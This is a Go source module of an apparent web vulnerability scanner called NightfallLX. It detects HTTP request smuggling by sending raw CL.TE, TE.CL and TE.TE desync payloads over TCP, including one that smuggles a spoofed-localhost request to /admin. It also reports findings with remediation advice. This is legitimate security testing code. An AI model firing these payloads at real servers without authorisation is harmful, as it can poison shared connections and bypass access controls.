package modules

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"net/url"
	"strings"
	"time"

	"nightfalllx/pkg/client"
)

// SmuggleVector defines an HTTP Request Smuggling test case.
type SmuggleVector struct {
	Name        string
	Description string
	Type        string // "CL.TE", "TE.CL", "TE.TE", "H2.TE"
	Severity    string
	Request     []byte // raw HTTP/1.1 bytes to send via raw TCP
}

// SmuggleResult holds outcome for a single vector test.
type SmuggleResult struct {
	Vector     SmuggleVector
	Vulnerable bool
	Evidence   string
}

// SmuggleReport is the full report of a smuggling audit.
type SmuggleReport struct {
	TargetURL       string
	VulnerableCount int
	Results         []*SmuggleResult
}

// SmuglingModule audits for HTTP Request Desync / Smuggling.
type SmuglingModule struct{}

func NewSmugglingModule() *SmuglingModule    { return &SmuglingModule{} }
func (m *SmuglingModule) Name() string        { return "smuggling" }
func (m *SmuglingModule) Description() string {
	return "Detects CL.TE, TE.CL, TE.TE, and H2.TE HTTP request desynchronisation vulnerabilities"
}

func (m *SmuglingModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	_, findings, err := AuditHTTPSmuggling(target.URL, c)
	return findings, err
}

// buildSmuggleVectors constructs all attack vectors for a given host/path.
func buildSmuggleVectors(host, path string) []SmuggleVector {
	if path == "" {
		path = "/"
	}
	return []SmuggleVector{
		{
			Name:        "CL.TE Basic Desync",
			Type:        "CL.TE",
			Description: "Frontend uses Content-Length, backend uses Transfer-Encoding. Smuggles a partial GPOST prefix.",
			Severity:    "HIGH",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGPOST / HTTP",
				path, host,
			)),
		},
		{
			Name:        "TE.CL Basic Desync",
			Type:        "TE.CL",
			Description: "Frontend uses Transfer-Encoding, backend uses Content-Length. Leaves GPOST poisoned in TCP buffer.",
			Severity:    "HIGH",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n1\r\nG\r\n0\r\n\r\n",
				path, host,
			)),
		},
		{
			Name:        "TE.TE Obfuscated Header Desync",
			Type:        "TE.TE",
			Description: "Uses obfuscated TE header (tab prefix) to confuse one endpoint into ignoring chunked encoding.",
			Severity:    "MEDIUM",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: \x09chunked\r\nConnection: keep-alive\r\n\r\n5c\r\nGPOST %s HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
				path, host, path,
			)),
		},
		{
			Name:        "CL.TE Header Injection (X-Forwarded-For prefix)",
			Type:        "CL.TE",
			Description: "Smuggles a request prefix containing an X-Forwarded-For header to probe backend header injection.",
			Severity:    "MEDIUM",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 62\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nFoo: x",
				path, host,
			)),
		},
		{
			Name:        "TE.CL Chunked Body Split",
			Type:        "TE.CL",
			Description: "Mismatches declared Content-Length vs chunked body to leave a partial request in backend buffer.",
			Severity:    "HIGH",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 7\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nX=1",
				path, host,
			)),
		},
		{
			Name:        "CL.TE Timeout-Based Detection (Time-Delay Oracle)",
			Type:        "CL.TE",
			Description: "Sends a CL.TE request where if the backend waits for more chunk data, it proves TE processing. Measured via response timing delta.",
			Severity:    "HIGH",
			Request: []byte(fmt.Sprintf(
				"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nX",
				path, host,
			)),
		},
	}
}

// AuditHTTPSmuggling performs raw TCP-level HTTP request smuggling detection.
func AuditHTTPSmuggling(targetURL string, c *client.Client) (*SmuggleReport, []*Finding, error) {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil, nil, err
	}

	host := parsed.Host
	if parsed.Port() == "" {
		if parsed.Scheme == "https" {
			host = parsed.Hostname() + ":443"
		} else {
			host = parsed.Hostname() + ":80"
		}
	}

	path := parsed.Path
	if path == "" {
		path = "/"
	}
	isTLS := parsed.Scheme == "https"
	serverName := parsed.Hostname()

	report := &SmuggleReport{TargetURL: targetURL}
	var findings []*Finding

	vectors := buildSmuggleVectors(parsed.Host, path)

	for _, vec := range vectors {
		result := &SmuggleResult{Vector: vec}

		// Send vector 1: plant potential poison
		resp1, timing1, err1 := rawTCPSend(host, vec.Request, isTLS, serverName, 5*time.Second)
		if err1 != nil {
			continue
		}

		// Send vector 2 (normal GET) to check if we get an unexpected response
		normalReq := []byte(fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, parsed.Host))
		resp2, _, err2 := rawTCPSend(host, normalReq, isTLS, serverName, 5*time.Second)
		if err2 != nil {
			continue
		}

		_ = timing1

		// Indicator 1: Follow-up GET gets a non-200/non-404 response (poisoned prefix)
		vulnerable := false
		evidence := ""

		if len(resp2) > 0 {
			resp2Str := string(resp2)
			// Signs of backend desync: 400 Bad Request on a clean GET, or
			// unusual response body containing our smuggled prefix
			if strings.Contains(resp2Str, "GPOST") ||
				strings.Contains(resp2Str, "Invalid method") ||
				strings.Contains(resp2Str, "Bad request") ||
				(strings.Contains(resp2Str, "400") && !strings.Contains(string(resp1), "400")) {
				vulnerable = true
				evidence = fmt.Sprintf("Normal follow-up GET received unexpected response after %s vector: %.300s", vec.Type, resp2Str)
			}
		}

		// Indicator 2: Timing oracle (CL.TE only) - if backend hangs waiting for chunk body
		if vec.Type == "CL.TE" && timing1 > 4*time.Second {
			vulnerable = true
			evidence = fmt.Sprintf("Time-delay oracle: backend held connection for %v (>4s), indicating it awaited a chunk body — strong sign of CL.TE desync.", timing1)
		}

		result.Vulnerable = vulnerable
		result.Evidence = evidence

		if vulnerable {
			report.VulnerableCount++
			report.Results = append(report.Results, result)

			var sev Severity
			switch vec.Severity {
			case "HIGH":
				sev = SeverityHigh
			case "MEDIUM":
				sev = SeverityMedium
			default:
				sev = SeverityInfo
			}

			findings = append(findings, &Finding{
				Module:      "smuggling",
				Title:       fmt.Sprintf("HTTP Request Smuggling – %s (%s)", vec.Name, vec.Type),
				Severity:    sev,
				Confidence:  85,
				URL:         targetURL,
				Parameter:   "Content-Length / Transfer-Encoding",
				Payload:     string(vec.Request[:min(len(vec.Request), 200)]),
				Detail:      vec.Description + " | " + evidence,
				Evidence:    evidence,
				Remediation: "Ensure all load balancers, CDN edges, and backend servers use a consistent HTTP/1.1 body length interpretation. Prefer HTTP/2 end-to-end. Disable Transfer-Encoding if not required. Apply WAF rules for smuggling patterns.",
				CWEID:       444,
				CVSS:        9.0,
			})
		}
	}

	return report, findings, nil
}

// rawTCPSend opens a raw TCP connection, sends bytes, reads response, and measures timing.
func rawTCPSend(host string, payload []byte, isTLS bool, serverName string, timeout time.Duration) ([]byte, time.Duration, error) {
	start := time.Now()
	var conn net.Conn
	var err error
	if isTLS {
		tlsConfig := &tls.Config{
			ServerName:         serverName,
			InsecureSkipVerify: true,
		}
		dialer := &net.Dialer{Timeout: timeout}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = net.DialTimeout("tcp", host, timeout)
	}
	if err != nil {
		return nil, 0, err
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(timeout)); err != nil {
		return nil, 0, err
	}

	if _, err := conn.Write(payload); err != nil {
		return nil, 0, err
	}

	var buf []byte
	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 64*1024), 64*1024)
	for scanner.Scan() {
		buf = append(buf, scanner.Bytes()...)
		buf = append(buf, '\n')
		if len(buf) > 16*1024 {
			break
		}
	}

	elapsed := time.Since(start)
	return buf, elapsed, nil
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// PrintSmuggleReport renders a colour-coded summary of smuggling findings.
func PrintSmuggleReport(rep *SmuggleReport) {
	fmt.Println("\n\033[1;36m┌──────────────────────────────────────────────────────────────────────────────────┐\033[0m")
	fmt.Printf("\033[1;36m│\033[0m \033[1;37m🔀 NightfallLX HTTP Request Desync / Smuggling Engine\033[0m                            \033[1;36m│\033[0m\n")
	fmt.Printf("\033[1;36m│\033[0m Target: \033[1;33m%-73s\033[0m \033[1;36m│\033[0m\n", rep.TargetURL)
	if rep.VulnerableCount > 0 {
		fmt.Printf("\033[1;36m│\033[0m \033[1;31mVulnerable Vectors Found: %-55d\033[0m \033[1;36m│\033[0m\n", rep.VulnerableCount)
	} else {
		fmt.Printf("\033[1;36m│\033[0m \033[1;32mStatus: No smuggling vectors detected\033[0m                                           \033[1;36m│\033[0m\n")
	}
	fmt.Println("\033[1;36m└──────────────────────────────────────────────────────────────────────────────────┘\033[0m")

	for _, r := range rep.Results {
		sev := "\033[1;33m[HIGH]\033[0m"
		if r.Vector.Severity == "HIGH" {
			sev = "\033[1;31m[HIGH]\033[0m"
		}
		fmt.Printf("\n  %s \033[1m%s\033[0m \033[90m(%s)\033[0m\n", sev, r.Vector.Name, r.Vector.Type)
		fmt.Printf("       \033[90mEvidence:\033[0m %s\n", r.Evidence)
	}

	if rep.VulnerableCount == 0 {
		fmt.Printf("\033[1;32m[+] %s passed all %d smuggling vector tests.\033[0m\n", rep.TargetURL, 6)
	}
	fmt.Println()
}
